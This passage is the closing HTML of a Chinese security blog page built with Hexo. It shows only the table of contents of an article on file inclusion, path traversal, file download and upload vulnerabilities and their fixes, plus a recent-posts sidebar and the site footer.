href="#3-1-%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88LFI%EF%BC%89"><span class="toc-number">1.3.1.</span> <span class="toc-text">3.1 本地文件包含（LFI）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88RFI%EF%BC%89"><span class="toc-number">1.3.2.</span> <span class="toc-text">3.2 远程文件包含（RFI）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-%E5%B8%B8%E8%A7%81%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E7%BB%95%E8%BF%87"><span class="toc-number">1.3.3.</span> <span class="toc-text">3.3 常见路径遍历绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.4.</span> <span class="toc-text">4. 文件下载漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-%E6%A3%80%E6%B5%8B%E4%B8%8E%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="toc-number">1.5.</span> <span class="toc-text">5. 检测与利用思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-%E4%B8%8A%E4%BC%A0%E6%88%90%E5%8A%9F%E5%88%A4%E6%96%AD"><span class="toc-number">1.5.1.</span> <span class="toc-text">5.1 上传成功判断</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-2-%E5%90%8E%E7%BC%80%E7%88%86%E7%A0%B4%E5%88%97%E8%A1%A8%EF%BC%88%E5%B8%B8%E8%A7%81%E5%8F%AF%E8%A7%A3%E6%9E%90%E5%90%8E%E7%BC%80%EF%BC%89"><span class="toc-number">1.5.2.</span> <span class="toc-text">5.2 后缀爆破列表（常见可解析后缀）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-3-%E4%B8%8A%E4%BC%A0%E8%B7%AF%E5%BE%84%E7%8C%9C%E6%B5%8B"><span class="toc-number">1.5.3.</span> <span class="toc-text">5.3 上传路径猜测</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE"><span class="toc-number">1.6.</span> <span class="toc-text">6. 修复建议</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF%E4%BF%AE%E5%A4%8D"><span class="toc-number">1.6.1.</span> <span class="toc-text">服务端修复</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE%E5%B1%82%E9%9D%A2"><span class="toc-number">1.6.2.</span> <span class="toc-text">配置层面</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-%E5%85%B8%E5%9E%8B-CVE-%E6%A1%88%E4%BE%8B%E5%8F%82%E8%80%83"><span class="toc-number">1.7.</span> <span class="toc-text">7. 典型 CVE &#x2F; 案例参考</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/11/24/mvc/" title="无标题"><img src="/img/lingboli.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="无标题"/></a><div class="content"><a class="title" href="/2025/11/24/mvc/" title="无标题">无标题</a><time datetime="2025-11-24T10:37:20.982Z" title="发表于 2025-11-24 18:37:20">2025-11-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/11/01/sql%E6%B3%A8%E5%85%A5/" title="无标题"><img src="/img/weierlite.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="无标题"/></a><div class="content"><a class="title" href="/2025/11/01/sql%E6%B3%A8%E5%85%A5/" title="无标题">无标题</a><time datetime="2025-11-01T02:34:02.849Z" title="发表于 2025-11-01 10:34:02">2025-11-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/09/10/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="无标题"><img src="/img/2.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="无标题"/></a><div class="content"><a class="title" href="/2025/09/10/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="无标题">无标题</a><time datetime="2025-09-10T13:43:22.532Z" title="发表于 2025-09-10 21:43:22">2025-09-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/07/21/JAVA%E5%85%A5%E9%97%A8/" title="JAVA基础"><img src="/img/weierlite.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="JAVA基础"/></a><div class="content"><a class="title" href="/2025/07/21/JAVA%E5%85%A5%E9%97%A8/" title="JAVA基础">JAVA基础</a><time datetime="2025-07-21T08:18:55.000Z" title="发表于 2025-07-21 16:18:55">2025-07-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/07/21/Java%E6%96%B9%E6%B3%95(%E5%87%BD%E6%95%B0)/" title="JAVA方法（函数）"><img src="/img/lingboli.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="JAVA方法（函数）"/></a><div class="content"><a class="title" href="/2025/07/21/Java%E6%96%B9%E6%B3%95(%E5%87%BD%E6%95%B0)/" title="JAVA方法（函数）">JAVA方法（函数）</a><time datetime="2025-07-21T08:18:55.000Z" title="发表于 2025-07-21 16:18:55">2025-07-21</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent;"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;2025 - 2026 By Tubby Little Hero</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.4.2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
